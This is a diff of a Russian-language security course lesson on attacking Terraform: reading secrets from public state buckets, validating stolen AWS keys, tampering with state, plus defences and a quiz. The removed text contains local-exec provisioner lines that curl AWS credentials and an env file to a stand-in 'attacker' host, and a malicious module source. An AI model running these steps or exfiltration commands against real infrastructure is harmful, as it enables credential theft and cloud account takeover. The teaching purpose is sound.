@@ -14,260 +14,213 @@ useful_for:
 estimated_minutes: 50
 summary: "Как атаковать Terraform/IaC: секреты в state и plan-файлах, злоупотребление провайдерами, drift и подмена модулей. Практические приёмы и типовые ошибки."
 ---
+## Задача
 
-Terraform описывает облако декларативно и хранит **state** — карту реальных ресурсов, часто с секретами в открытом виде. Пайплайн `terraform apply` исполняется с облачными кредами и может создавать любые ресурсы. Урок про то, где искать секреты в IaC и как злоупотребить пайплайном.
+В `cloud-supply-chain` мы подкладывали код через зависимости. Но в облаке есть ещё один «файл, которому все доверяют», — **Terraform state**. Terraform — это инструмент **IaC** (Infrastructure as Code): инфраструктура (серверы, сети, базы) описывается в текстовых файлах и создаётся командами, а не руками в консоли.
 
-## Terraform state: почему это сокровищница
+Задача: найти `terraform.tfstate` и посмотреть, что в нём лежит. Часто это самый быстрый путь к секретам всего аккаунта. Разберём на конкретном публичном бакете.
 
-State (`terraform.tfstate`) содержит атрибуты всех ресурсов, включая:
+## Данные: бакет, который «просто хранит состояние»
 
-- пароли БД, созданные ресурсом;
-- ключи доступа, сгенерированные в `aws_iam_access_key`;
-- значения `sensitive`-переменных (они всё равно лежат в state);
-- строки подключения, токены, сертификаты.
+У цели есть S3-бакет `acme-tfstate-prod` — по имени видно, что он для состояния Terraform. Проверяем доступ к листингу:
 
-```bash
-# Найти state-файлы
-find / -name "*.tfstate*" 2>/dev/null
-# Часто в S3/GCS/Blob (remote backend)
-aws s3 ls | grep -i terraform
-aws s3 cp s3://<bucket>/terraform.tfstate . && jq . terraform.tfstate
-
-# Поиск секретов в state
-jq -r '.. | .password? // empty' terraform.tfstate
-grep -oE 'AKIA[0-9A-Z]{16}' terraform.tfstate
-jq -r '.. | .secret? // .token? // empty' terraform.tfstate
+```
+$ aws s3 ls s3://acme-tfstate-prod/ --no-sign-request
+2025-03-14 09:11:02       8192 terraform.tfstate
+2025-03-14 09:11:02       4096 terraform.tfstate.backup
 ```
 
-Plan-файлы (`tfplan`, `plan.out`) тоже содержат значения. Ищите `.terraform/`, `*.tfvars`, `*.tfplan`.
+`--no-sign-request` — это анонимный запрос, без наших кредов. Он вернул содержимое бакета: листинг открыт всему интернету. Скачиваем state:
 
-## Разведка IaC-пайплайна
-
-```bash
-# Где исполняется terraform (CI job)
-grep -rE 'terraform (plan|apply)|tofu' .github/ .gitlab-ci.yml Jenkinsfile
-# Переменные окружения пайплайна
-grep -rE 'TF_VAR_|AWS_ACCESS_KEY|ARM_CLIENT' . --hidden
-# Модули и их источники
-grep -rE 'source *= *"git::|source *= *"https://' *.tf
+```
+$ aws s3 cp s3://acme-tfstate-prod/terraform.tfstate . --no-sign-request
+download: s3://acme-tfstate-prod/terraform.tfstate to ./terraform.tfstate
 ```
 
-## Злоупотребление провайдерами и modules
+## Почему state — это сокровищница
 
-Провайдеры и модули исполняют код. Вредоносный модуль (например, с `local-exec`) исполняет команды на машине, где запущен `terraform apply`:
+**State-файл** — это «память» Terraform: он хранит соответствие между описанными в коде ресурсами и реальными объектами в облаке. Чтобы управлять ресурсами, Terraform записывает в state **всё их состояние** — включая то, что в коде было переменной.
 
-```hcl
-module "evil" {
-  source = "git::https://attacker/evil.git"
-}
+Опасность в том, что в state попадают значения, которые в конфиге выглядели безобидно:
 
-# или прямо в ресурсе
-resource "null_resource" "pwn" {
-  provisioner "local-exec" {
-    command = "curl -s https://attacker/?t=$(cat ~/.aws/credentials | base64)"
-  }
-}
+- пароли баз данных (генерируются и сохраняются);
+- приватные ключи (`tls_private_key`);
+- секреты, вписанные через `variable`;
+- выводы (`output`) — их часто используют, чтобы «пробросить» креды в другие стеки.
+
+State — это **plaintext-слепок всего, чем управляет Terraform**.
+
+## Пробуем в лоб: ищем в state секреты
+
+Ищем в скачанном файле характерные строки:
+
+```
+$ grep -oE '(password|secret|access_key|private_key)"?: ?"[^"]+' terraform.tfstate | head
+password": "P@ssw0rd-prod-2025"
+secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+private_key": "-----BEGIN RSA PRIVATE KEY-----"
 ```
 
-Подмена источника модуля (`source`) — supply-chain вектор: если реестр модулей или git-URL подконтролен, ваш `apply` исполняет чужой код.
+Пароль БД, секретный ключ AWS и приватный RSA-ключ — всё в открытом виде. State не шифрует значения на уровне полей: шифрование (если есть) — только «на диске» бакета.
 
-## Drift и ручные правки
+## Приём: достаём конкретные ресурсы и outputs
 
-**Drift** — расхождение между state и реальностью. Иногда drift используют, чтобы:
+Чтобы не грепать вслепую, используем штатные команды Terraform — они умеют читать state и показывать структуру. Если у нас есть доступ к директории с конфигом:
 
-- найти ресурсы, созданные вручную (и их креды);
-- замаскировать свои ресурсы под «ручные правки»;
-- понять, что защита реально применяет.
-
-```bash
-terraform plan           # покажет drift и изменения
-terraform state list     # все ресурсы в state
-terraform state show <res>
-terraform output         # outputs (могут содержать секреты)
 ```
+$ terraform state list
+aws_db_instance.prod
+aws_iam_user.deployer
+aws_iam_access_key.deployer
+module.app.tls_private_key.ssh
 
-## Разобранный пример: state в S3 → облачные креды
-
-**Дано:** публично читаемый бакет с `terraform.tfstate`.
-
-1. Находим бакет:
-
-```bash
-aws s3 ls s3://<bucket>/ --no-sign-request
-aws s3 cp s3://<bucket>/prod/terraform.tfstate . --no-sign-request
-```
-
-2. Ищем секреты:
-
-```bash
-jq -r '.. | objects | select(.type? == "aws_iam_access_key") |
-  .values | "\(.id) \(.secret)"' terraform.tfstate
-grep -oE '(AKIA[0-9A-Z]{16}|[A-Za-z0-9/+=]{40})' terraform.tfstate | head
-```
-
-3. Проверяем креды:
-
-```bash
-AWS_ACCESS_KEY_ID=<AK> AWS_SECRET_ACCESS_KEY=<SK> aws sts get-caller-identity
-```
-
-4. Роль из state часто имеет широкие права → эскалация (см. `cloud-privesc-iam`).
-
-## Защита
-
-- **Remote backend с шифрованием и блокировкой** (S3+DynamoDB, GCS).
-- **Не хранить секреты в state** — использовать secret-менеджеры и `data`-источники.
-- **`sensitive = true`** скрывает значение в выводе, но НЕ в state.
-- **Pinned modules** и проверка источников; никаких `git::https` из недоверенных.
-- **`terraform plan` в PR без секретов** — не давать недоверенному коду креды.
-
-## Частые ошибки
-
-- **Считать `sensitive` защитой.** В state значение всё равно открыто.
-- **Хранить state в публичном бакете.** Классическая утечка.
-- **Игнорировать plan-файлы.** Они содержат те же значения.
-- **Доверять источнику модуля.** `source` — исполняемый код.
-- **Не смотреть outputs.** Часто там пароли и ключи.
-- **Забывать про local-exec.** Провиженеры исполняют команды на раннере.
-
-## Что дальше / решение
-
-- Нашли state → ищите `aws_iam_access_key`, пароли, токены.
-- Нашли пайплайн → смотрите переменные и модули.
-- Нашли drift → анализируйте ручные ресурсы.
-- Смежные уроки: `cloud-cloudformation`, `cloud-supply-chain`, `cloud-credential-hunting`.
-
-## Формат state и что в нём лежит
-
-State — JSON, хранящий сопоставление ресурсов Terraform и реальных объектов, а также (часто) секреты: пароли RDS, ключи, токены. Пример структуры:
-
-```json
-{"resources":[{"type":"aws_db_instance","instances":[{"attributes":{
- "password":"SuperSecret123","endpoint":"db.xxx.rds.amazonaws.com"}}]}]}
-```
-
-Backend может быть локальным, S3, GCS, Azure Blob, Terraform Cloud. S3-backend без шифрования и с широкой политикой — прямая утечка всех секретов инфраструктуры.
-
-## Инструменты анализа IaC
-
-```bash
-tflint --recursive
-checkov -d . --framework terraform --output json
-tfsec . --format json
-terrascan scan -t aws -d .
-terraform show -json state.json | jq '.values.root_module.resources[] | select(.type=="aws_iam_policy")'
-```
-
-`checkov -d` — директория, `--framework`, `-o`; `tfsec .` сканирует текущую папку; `terrascan -t aws` — по облаку. Для state используйте `terraform show -json` и jq.
-
-## Атаки на провайдеры и модули
-
-- **Провайдер из недоверенного источника** — выполнение кода при `terraform init`.
-- **Модуль с `provisioner`** — `remote-exec`/`local-exec` запускает команды на CI-раннере.
-- **`data`-источники с SSRF** — обращение к metadata.
-- **Подмена модуля** — если версия не запинена (`source` без `?ref=`), может быть подменён.
-
-```hcl
-module "db" {
-  source = "git::https://github.com/org/mod.git"   # без ref → mutable
+$ terraform output -json
+{
+  "db_endpoint": {"value": "prod-db.abc.us-east-1.rds.amazonaws.com"},
+  "deployer_access_key": {"value": "AKIAIOSFODNN7EXAMPLE"}
 }
 ```
 
-## Разобранный пример 2: модуль с local-exec
+`terraform output` — выводы стека; `deployer_access_key` — это IAM-ключ деплоера, доступный любому, кто прочитал state. Если конфига нет, state всё равно парсится вручную: `terraform show -json terraform.tfstate | jq '..|.attributes?|select(.)'`.
 
-```hcl
-resource "null_resource" "hook" {
-  provisioner "local-exec" { command = "curl -d @/etc/terraform.env http://attacker/" }
+## Полный прогон: от открытого бакета до админского ключа
+
+1. **Находим бакет.** По имени `*tfstate*`/`*terraform*`; проверяем листинг `--no-sign-request`.
+2. **Скачиваем state.** `aws s3 cp ... --no-sign-request`.
+3. **Парсим.** `grep` по секретам либо `terraform show -json`.
+4. **Достаём outputs.** Часто там готовые креды для «проброса» между стеками.
+5. **Проверяем ключ.** Если это IAM-ключ:
+
+```
+$ AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity
+{ "Account": "123456789012", "Arn": "arn:aws:iam::123456789012:user/deployer" }
+```
+
+6. **Смотрим права.** `aws iam list-attached-user-policies --user-name deployer` → возможно, `AdministratorAccess`.
+
+Так один забытый публичный бакет превращается в полный контроль над аккаунтом.
+
+## Приём 2: подмена state
+
+Чтение state — не единственный вектор. Если у нас есть **запись** в бакет с state, мы можем его подменить — и Terraform поверит. Сценарий: подменяем в state атрибут ресурса, и следующий `terraform apply` в пайплайне применит наше значение.
+
+Простой пример: в state у ресурса `aws_iam_user.deployer` меняем имя на `admin` — и пайплайн «обновит» не того пользователя. Более прямой путь — подменить в state секрет, который пайплайн потом «пробрасывает» дальше. Защита от этого — **версионирование бакета** и `DynamoDB lock`, но они лишь фиксируют факт изменения, а не мешают ему.
+
+## Где ещё живёт state
+
+- **S3 backend** — самый частый; смотрите `backend "s3"` в `*.tf`.
+- **GCS / Azure Blob backend** — то же самое у GCP/Azure.
+- **Terraform Cloud / GitLab-managed state** — если есть токен платформы.
+- **Локальный `terraform.tfstate`** — иногда коммитится в git (ищите `grep -r tfstate`).
+
+Проверить backend из конфига:
+
+```
+$ grep -A5 'backend "' *.tf
+backend "s3" {
+  bucket = "acme-tfstate-prod"
+  key    = "terraform.tfstate"
+  region = "us-east-1"
 }
 ```
 
-При `terraform apply` на CI-раннере секреты окружения уходят наружу. Ищите `local-exec`/`remote-exec` в модулях — это частый путь supply-chain-атаки.
+## Защита и что ломает атаку
 
-## Практика
+- **Шифрование state + строгий доступ.** State должен лежать в приватном бакете с `SSE-KMS` и политикой «только пайплайн».
+- **Не хранить секреты в IaC.** Пароли — из Secrets Manager, ссылкой, а не значением.
+- **`sensitive = true`** помечает вывод как чувствительный, но **не шифрует** его в state — это лишь скрывает его в CLI.
+- **Блокировка state** (`DynamoDB lock`) защищает от одновременной записи, но не от чтения.
+- **Ротация.** Любой секрет, попавший в state, надо считать скомпрометированным и ротировать.
 
-1. Найдите state (S3-бакет, git, Terraform Cloud).
-2. Извлеките секреты и креды.
-3. Проверьте, какие роли/права описаны в IaC.
-4. Найдите `local-exec` и unpinned-модули.
-5. Сопоставьте state с реальными ресурсами (drift).
+## Если не сработало
 
-## Drift как индикатор
+- **Бакет закрыт, но есть `s3:GetObject`** — качаем напрямую, не листингуя.
+- **State зашифрован KMS** — без `kms:Decrypt` содержимое не читается.
+- **Backend Terraform Cloud** — нужен токен платформы.
+- **Секретов нет** — смотрим outputs и имена ресурсов: они дают карту инфраструктуры для дальнейшей разведки.
 
-Drift — расхождение между state и реальной инфраструктурой. Он возникает при ручных правках, а для атакующего означает: изменения, сделанные вне Terraform, не будут откачены автоматически. `terraform plan` покажет drift, но если пайплайн не запускается или игнорирует изменения — ваши правки выживут. Проверяйте, есть ли периодический `plan`/`apply` и реагирует ли команда на drift. Часто персистентность через ручные ресурсы остаётся незамеченной именно из-за отсутствия контроля drift.
+## Мини-сценарий: открытый бакет со state
 
-## Практическое задание
+1. **Находим бакет.** Имя `acme-tfstate-prod` намекает на Terraform. `aws s3 ls s3://acme-tfstate-prod/ --no-sign-request` → листинг открыт.
+2. **Качаем.** `aws s3 cp s3://acme-tfstate-prod/terraform.tfstate . --no-sign-request`.
+3. **Парсим.** `grep -oE '(password|secret_key|private_key)"?: ?"[^"]+' terraform.tfstate` → пароль БД, секретный ключ AWS, приватный RSA.
+4. **Outputs.** Если есть конфиг: `terraform output -json` → `deployer_access_key`.
+5. **Проверяем.** `aws sts get-caller-identity` с найденным ключом → `user/deployer`.
+6. **Эскалация.** `aws iam list-attached-user-policies --user-name deployer` → возможно, `AdministratorAccess`.
 
-Создайте локальный state с ресурсом, содержащим «секрет». Запустите `terraform show -json` и извлеките значение. Затем найдите в примере модуля `local-exec` и объясните, как он выполнится на CI. Наконец, настройте S3-backend с шифрованием и сравните, как меняется экспозиция секретов. Это даёт понимание, почему state — сокровищница и как её защищать.
+Один забытый публичный бакет — и весь аккаунт открыт.
 
-## Мини-лаборатория: state в локальном backend
+## Что мы теперь знаем
 
-```bash
-terraform init
-terraform apply -auto-approve
-terraform show -json | jq '.values.root_module.resources[].values' | grep -iE 'password|secret|key'
-```
+1. State — plaintext-память Terraform со всеми значениями ресурсов.
+2. Открытый бакет со state = утечка паролей, ключей и outputs.
+3. `terraform state list`/`output` — штатный способ вытащить данные.
+4. `sensitive` скрывает вывод в CLI, но не в state.
+5. Защита — приватный бакет, KMS, секреты по ссылке, ротация.
 
-Локальный state лежит в `terraform.tfstate` в открытом виде. Убедитесь, что он не попадает в git (`.gitignore`), а для командных проектов используется зашифрованный remote backend с ограниченным доступом. Утечка state = утечка всей инфраструктуры.
+## На что смотреть дальше
 
-## Быстрая проверка state
-
-```bash
-aws s3 ls | grep tfstate
-aws s3 cp s3://bucket/terraform.tfstate . --no-sign-request
-jq '.resources[].instances[].attributes' terraform.tfstate | grep -iE 'password|secret|key'
-```
-
-State в открытом бакете — частая находка. Проверьте также Terraform Cloud/remote backend и git-историю на `.tfstate`.
+- Бакеты с `tfstate`/`terraform` в имени и их листинг.
+- `backend`-блоки в `*.tf` — куда пишется state.
+- `output`-блоки — часто содержат креды для «проброса».
+- `tls_private_key` и `aws_iam_access_key` в state.
+- Коммиты `*.tfstate` в git-истории.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Почему Terraform state считается сокровищницей?"
+- question: "Почему terraform.tfstate опасен при утечке?"
   options:
-    - "В нём в открытом виде лежат атрибуты ресурсов, включая секреты"
-    - "Он шифрует все данные"
-    - "Он не содержит значений"
-    - "Он хранится только в памяти"
+    - "Он хранит значения ресурсов в открытом виде, включая пароли и ключи"
+    - "Он ускоряет сборку"
+    - "Он шифрует инфраструктуру"
+    - "Он содержит только имена"
   answer: 0
-  explanation: "State хранит реальные значения ресурсов."
-- question: "Защищает ли флаг sensitive=true значение в state?"
+  explanation: "State — plaintext-слепок состояния всех ресурсов."
+- question: "Что делает флаг sensitive = true для секрета?"
   options:
-    - "Нет, он скрывает вывод, но значение остаётся в state"
-    - "Да, шифрует state"
-    - "Да, удаляет значение"
-    - "Да, блокирует apply"
+    - "Скрывает значение в выводе CLI, но НЕ шифрует его в state"
+    - "Шифрует секрет в state"
+    - "Удаляет секрет"
+    - "Отправляет секрет в KMS"
   answer: 0
-  explanation: "sensitive влияет на вывод, не на хранение."
-- question: "Чем опасен произвольный source модуля?"
+  explanation: "sensitive влияет на отображение, а не на хранение."
+- question: "Какая команда выводит outputs стека Terraform?"
   options:
-    - "Модуль исполняет код на машине, где запущен apply"
-    - "Он ускоряет план"
-    - "Он меняет цвет вывода"
-    - "Он безвреден"
+    - "terraform output"
+    - "terraform apply"
+    - "terraform init"
+    - "terraform fmt"
   answer: 0
-  explanation: "Модули и провайдеры исполняют код."
-- question: "Что такое drift в Terraform?"
+  explanation: "terraform output показывает значения outputs."
+- question: "Где чаще всего лежит state в AWS?"
   options:
-    - "Расхождение между state и реальной инфраструктурой"
-    - "Скорость apply"
-    - "Формат .tf"
-    - "Тип провайдера"
+    - "В S3-бакете, указанном в backend-блоке"
+    - "В DynamoDB"
+    - "В Lambda"
+    - "В CloudFront"
   answer: 0
-  explanation: "Drift — ручные изменения вне Terraform."
-- question: "Как чаще всего утекает prod state?"
+  explanation: "Стандартный backend — S3 (плюс DynamoDB для блокировки)."
+- question: "Что делать с секретом, найденным в state?"
   options:
-    - "Публично доступный S3/GCS/Blob backend"
-    - "Через DNS"
-    - "Через favicon"
-    - "Через robots.txt"
+    - "Считать его скомпрометированным и ротировать"
+    - "Игнорировать"
+    - "Зашифровать бакет задним числом"
+    - "Удалить файл"
   answer: 0
-  explanation: "Открытый remote backend — классическая утечка."
+  explanation: "Попавший в state секрет надо ротировать."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-supply-chain-sbom`) мы посмотрим, как проверить подлинность артефактов — и как эту проверку обмануть. А пока главное: state — это не «служебный файл», а полный слепок твоей инфраструктуры с секретами, и открытый к нему доступ равен компрометации аккаунта.
 
 ## Где пригодится
 
-- **Red team:** IaC-пайплайн как путь к облачным кредам.
-- **Bug bounty:** открытые state-бакеты и мисконфиги.
-- **Пентест:** аудит backend, модулей, провиженеров.
-- **Работа/DevSecOps:** шифрование state, pinned-модули, вынос секретов.
-- **Дальше по дереву:** `cloud-cloudformation`, `cloud-supply-chain`.
+- **Bug bounty:** открытые бакеты с tfstate.
+- **Red team:** от IaC-бэкенда к ключам аккаунта.
+- **Пентест:** аудит Terraform-инфраструктуры.
+- **Работа/DevSecOps:** приватный backend, KMS, секреты по ссылке.
+- **Дальше по дереву:** `cloud-terraform-state`, `cloud-cloudformation`.
